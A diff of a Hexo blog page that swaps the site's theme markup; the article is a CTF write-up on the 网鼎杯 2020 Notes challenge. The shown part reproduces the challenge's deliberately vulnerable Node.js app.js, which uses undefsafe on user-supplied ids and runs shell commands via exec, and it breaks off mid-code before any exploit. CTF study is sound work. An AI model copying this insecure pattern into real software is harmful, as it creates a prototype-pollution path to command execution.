@@ -1,430 +1,160 @@
-<!DOCTYPE html>
-<html 
-	lang="en">
-	<head>
-		<meta charset="UTF-8" />
-		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-		
-<link rel="stylesheet" href="/css/layout.css">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Nssctf刷题-网鼎杯 | clown</title><meta name="author" content="clown"><meta name="copyright" content="clown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[网鼎杯 2020青龙组]Notes这里没给题目源码只能网上找，app.js源码如下： var express &#x3D; require(&#x27;express&#x27;);var path &#x3D; require(&#x27;path&#x27;);const undefsafe &#x3D; require(&#x27;undefsafe&#x27;);const &#123; exec &#125; &#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nssctf刷题-网鼎杯">
+<meta property="og:url" content="https://clowsman.github.io/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/index.html">
+<meta property="og:site_name" content="clown">
+<meta property="og:description" content="[网鼎杯 2020青龙组]Notes这里没给题目源码只能网上找，app.js源码如下： var express &#x3D; require(&#x27;express&#x27;);var path &#x3D; require(&#x27;path&#x27;);const undefsafe &#x3D; require(&#x27;undefsafe&#x27;);const &#123; exec &#125; &#x3D;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/clowsman/image@main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240329154907.jpg">
+<meta property="article:published_time" content="2024-03-20T08:35:09.000Z">
+<meta property="article:modified_time" content="2024-03-28T09:35:27.398Z">
+<meta property="article:author" content="clown">
+<meta property="article:tag" content="ctf 刷题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/clowsman/image@main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240329154907.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://clowsman.github.io/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Nssctf刷题-网鼎杯',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-28 17:35:27'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
 
-		
-		<title> Nssctf刷题-网鼎杯 -  clown</title>
-		<link rel="stylesheet" href="https://unpkg.com/mdui@1.0.2/dist/css/mdui.min.css" />
-		<script src="https://unpkg.com/mdui@1.0.2/dist/js/mdui.min.js"></script>
-		<!-- lazyload -->
-		<script src="https://unpkg.com/lazysizes@5.1.0/lazysizes.min.js"></script>
-		<!-- smooth-scrolling -->
-		<script src="https://unpkg.com/smooth-scrolling.js@1.0.0"></script>
-		<!-- highlight -->
-		<link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/atom-one-dark.min.css" />
-		<script src="//unpkg.com/@highlightjs/cdn-assets@11.6.0/highlight.min.js"></script>
-		<!-- 预置 kiraicon -->
-		
-<link rel="stylesheet" href="/lib/iconfont/iconfont.css">
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
 
-		
-		<link
-			rel="shortcut icon"
-			href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
-			type="image/png"
-		/>
-		
-<link rel="stylesheet" href="/deps/css/APlayer.min.css">
-
-		
-			
-				
-<link rel="stylesheet" href="/style.css">
-
-			
-				
-<link rel="stylesheet" href="/custom.css">
-
-			
-		
-		
-<script src="/deps/js/APlayer.min.js"></script>
-<script src="/deps/js/Meting.min.js"></script>
-
-	<meta name="generator" content="Hexo 7.0.0"></head>
-
-	<body>
-		<div
-			class="kira-background"
-			style="background-image: url('https://cdn.jsdelivr.net/gh/clowsman/image@1.0/back.png')"
-		></div>
-		<div class="kira-header">
-    <a
-        class="kira-drawer-button mdui-ripple"
-        title="导航栏"
-        onclick="document.querySelector('.kira-sidebar-modal').classList.add('show');document.querySelector('.kira-sidebar#sidebar').classList.add('show');"
-    >
-        <i class="kirafont icon-menu"></i>
-    </a>
-    <a href="/" title="clown">
-        <img
-			src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
-			alt="clown"
-		/>
-    </a>
-</div>
-		<div class="kira-body">
-			<div class="kira-sidebar" id="sidebar">
-	<div class="kira-avatar mdui-ripple">
-		<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" title="clown">
-			<img
-				src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
-				alt="clown"
-			/>
-		</a>
-	</div>
-	<div class="kira-count">
-		<div><span>文章</span>24</div>
-		<div><span>标签</span>13</div>
-		<div><span>分类</span>13</div>
-	</div>
-	<div class="kira-list">
-		
-		<a
-			class="kira-list-item mdui-ripple false"
-			href="/"
-			title="回到首页"
-		>
-			<i
-				class="kirafont
-					
-						icon-home
-					"
-			></i>
-			<div class="kira-list-item-content">
-				回到首页
-			</div>
-		</a>
-		
-		<a
-			class="kira-list-item mdui-ripple false"
-			href="/archive.html"
-			title="文章归档"
-		>
-			<i
-				class="kirafont
-					
-						icon-container
-					"
-			></i>
-			<div class="kira-list-item-content">
-				文章归档
-			</div>
-		</a>
-		
-		<a
-			class="kira-list-item mdui-ripple false"
-			href="/about.html"
-			title="关于本人"
-		>
-			<i
-				class="kirafont
-					
-						icon-user
-					"
-			></i>
-			<div class="kira-list-item-content">
-				关于本人
-			</div>
-		</a>
-		
-		<a
-			class="kira-list-item mdui-ripple false"
-			href="/friends.html"
-			title="我的朋友"
-		>
-			<i
-				class="kirafont
-					
-						icon-team
-					"
-			></i>
-			<div class="kira-list-item-content">
-				我的朋友
-			</div>
-		</a>
-		
-	</div>
-	<aside id="kira-sidebar">
-		
-			<div class="kira-widget-wrap">
-	<div class="kira-widget kira-social">
-		
-			<a
-				class="mdui-ripple"
-				href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1056317718&website=www.oicqzone.com"
-				target="_blank"
-				mdui-tooltip="{content: 'QQ'}"
-				style="color: rgb(49, 174, 255); background-color: rgba(49, 174, 255, .1);"
-			>
-				<i
-					class="kirafont
-					
-						icon-QQ
-					"
-				></i>
-			</a>
-		
-			<a
-				class="mdui-ripple"
-				href="https://space.bilibili.com/378722283"
-				target="_blank"
-				mdui-tooltip="{content: '哔哩哔哩'}"
-				style="color: rgb(231, 106, 141); background-color: rgba(231, 106, 141, .15);"
-			>
-				<i
-					class="kirafont
-					
-						icon-bilibili
-					"
-				></i>
-			</a>
-		
-			<a
-				class="mdui-ripple"
-				href="https://github.com/clowsman"
-				target="_blank"
-				mdui-tooltip="{content: 'GitHub'}"
-				style="color: rgb(25, 23, 23); background-color: rgba(25, 23, 23, .15);"
-			>
-				<i
-					class="kirafont
-					
-						icon-github
-					"
-				></i>
-			</a>
-		
-			<a
-				class="mdui-ripple"
-				href="https://gitee.com/ljc0033"
-				target="_blank"
-				mdui-tooltip="{content: 'Gitee'}"
-				style="color: rgb(165, 15, 15); background-color: rgba(165, 15, 15, .15);"
-			>
-				<i
-					class="kirafont
-					
-						icon-gitee
-					"
-				></i>
-			</a>
-		
-	</div>
-</div>
-
-		
-			
-  <div class="kira-widget-wrap">
-    <h3 class="kira-widget-title">分类</h3>
-    <div class="kira-widget">
-      <ul class="category-list">
-        
-        
-
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/Web/">
-              Web
-            </a>
-            <span class="category-list-count">1</span>
-          </li>
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/blog/">
-              blog
-            </a>
-            <span class="category-list-count">2</span>
-          </li>
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/ctf-web/">
-              ctf web
-            </a>
-            <span class="category-list-count">1</span>
-          </li>
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/git/">
-              git
-            </a>
-            <span class="category-list-count">1</span>
-          </li>
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/go/">
-              go
-            </a>
-            <span class="category-list-count">1</span>
-          </li>
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/web/">
-              web
-            </a>
-            <span class="category-list-count">4</span>
-          </li>
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/内网渗透/">
-              内网渗透
-            </a>
-            <span class="category-list-count">4</span>
-          </li>
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/区块链/">
-              区块链
-            </a>
-            <span class="category-list-count">1</span>
-          </li>
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/基础/">
-              基础
-            </a>
-            <span class="category-list-count">4</span>
-          </li>
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/基础-计网/">
-              基础 计网
-            </a>
-            <span class="category-list-count">1</span>
-          </li>
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/基础-计网/">
-              基础,计网
-            </a>
-            <span class="category-list-count">1</span>
-          </li>
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/提权/">
-              提权
-            </a>
-            <span class="category-list-count">1</span>
-          </li>
-        
-          <li class="category-list-item">
-            <a class="category-list-link" href="/categories/环境配置/">
-              环境配置
-            </a>
-            <span class="category-list-count">1</span>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-		
-			
-	<div class="kira-widget-wrap">
-		<div id="randomtagcloud" class="kira-widget tagcloud kira-rainbow">
-			<a href="/tags/CTF-BC/" style="font-size: 10px;">CTF BC</a> <a href="/tags/CTF-web/" style="font-size: 10px;">CTF web</a> <a href="/tags/CTF-%E5%86%85%E7%BD%91/" style="font-size: 10px;">CTF 内网</a> <a href="/tags/Web-CTF/" style="font-size: 10px;">Web CTF</a> <a href="/tags/c-c-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" style="font-size: 10px;">c/c++ 环境配置</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/ctf-%E5%88%B7%E9%A2%98/" style="font-size: 13.33px;">ctf 刷题</a> <a href="/tags/go/" style="font-size: 10px;">go</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/web-ctf-nodejs/" style="font-size: 10px;">web ctf nodejs</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 16.67px;">内网渗透</a> <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 16.67px;">学习</a> <a href="/tags/%E8%AE%A1%E7%BD%91/" style="font-size: 20px;">计网</a>
-		</div>
-		
-	</div>
-
-
-		
-	</aside>
-	<div class="kira-copyright">
-		&copy; 2024
-		<a href="/">clown</a>
-		Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> &
-		<a href="https://github.com/ch1ny/kira-hexo/" target="_blank">Kira-Hexo</a>
-		<br />
-		
-		
-	</div>
-</div>
-<div
-	class="kira-sidebar-modal"
-	id="sidebar-modal"
-	onclick="(function(self) {
-		self.classList.remove('show');
-		document.querySelector('.kira-sidebar.show#sidebar').classList.remove('show');
-	})(this)"
-></div>
-			<div class="kira-content">
-				<div id="kira-top-header"></div>
-				<div class="kira-main-content">
-					
-<link rel="stylesheet" href="/css/kira-image.css">
-
-
-<script src="/js/kira-image.js"></script>
-
-<div class="kira-image">
-    <div class="kira-image-modal">
-        <div class="kira-image-header">
-            <div class="kira-image-counter"></div>
-            <div class="kira-image-title"></div>
-            <div class="kira-image-operation">
-                <div class="kira-image-operation-button" id="kira-image-operation-button-zoom">
-                    <i class="kirafont icon-zoom-in"></i>
-                </div>
-                <div class="kira-image-operation-button" id="kira-image-operation-button-close">
-                    <i class="kirafont icon-close"></i>
-                </div>
-            </div>
-        </div>
-        <div class="kira-image-container">
-            <div class="kira-image-prev-button-panel">
-                <div class="kira-image-exchange-button">
-                    <i class="kirafont icon-left"></i>
-                </div>
-            </div>
-            <div class="kira-image-list">
-                <div class="kira-image-prev">
-                    <img />
-                </div>
-                <div class="kira-image-now">
-                    <img />
-                </div>
-                <div class="kira-image-next">
-                    <img />
-                </div>
-            </div>
-            <div class="kira-image-next-button-panel">
-                <div class="kira-image-exchange-button">
-                    <i class="kirafont icon-right"></i>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-<div class="kira-post">
-	<article>
-		
-		<div
-			class="kira-post-cover"
-			style="padding-bottom: '56.25%'"
-		>
-			<img
-				data-src="https://cdn.jsdelivr.net/gh/clowsman/image@1.0/back.png"
-				data-sizes="auto"
-				alt="Nssctf刷题-网鼎杯"
-				class="lazyload kira-post-cover-image disabled-kira-image"
-			/>
-			<h1>Nssctf刷题-网鼎杯</h1>
-		</div>
-		
-		<div class="kira-post-meta kira-rainbow" style="margin:10px 0!important;">
-			<a><i class="kirafont icon-calendar-fill"></i>2024年03月20日</a>
-			<a><i class="kirafont icon-edit-fill"></i>1.7k 字</a>
-			<a><i class="kirafont icon-time-circle-fill"></i>大概 8 分钟</a>
-		</div>
-		<h1><span id="wang-ding-bei-2020-qing-long-zu-notes">[网鼎杯 2020青龙组]Notes</span><a href="#wang-ding-bei-2020-qing-long-zu-notes" class="header-anchor">#</a></h1><p>这里没给题目源码只能网上找，app.js源码如下：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; exec &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Notes</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">owner</span> = <span class="hljs-string">&quot;whoknows&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span> = &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">write_note</span>(<span class="hljs-params">author, raw_note</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[(<span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>++).<span class="hljs-title function_">toString</span>()] = &#123;<span class="hljs-string">&quot;author&quot;</span>: author,<span class="hljs-string">&quot;raw_note&quot;</span>:raw_note&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">get_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">var</span> r = &#123;&#125;<br>        <span class="hljs-title function_">undefsafe</span>(r, id, <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id));<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br><br>    <span class="hljs-title function_">get_all_notes</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>;<br>    &#125;<br><br>    <span class="hljs-title function_">remove_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[id];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> notes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notes</span>();<br>notes.<span class="hljs-title function_">write_note</span>(<span class="hljs-string">&quot;nobody&quot;</span>, <span class="hljs-string">&quot;this is nobody&#x27;s first note&quot;</span>);<br><br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Notebook&#x27;</span> &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/add_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;please use POST to add a note&#x27;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> raw = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (author &amp;&amp; raw) &#123;<br>            notes.<span class="hljs-title function_">write_note</span>(author, raw);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;add note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;did not add note&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/delete_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to delete a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">if</span> (id) &#123;<br>            notes.<span class="hljs-title function_">remove_note</span>(id);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete done&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/notes&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>        <span class="hljs-keyword">let</span> a_note;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;<br>            a_note = notes.<span class="hljs-title function_">get_all_notes</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a_note = notes.<span class="hljs-title function_">get_note</span>(q);<br>        &#125;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            <span class="hljs-title function_">exec</span>(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    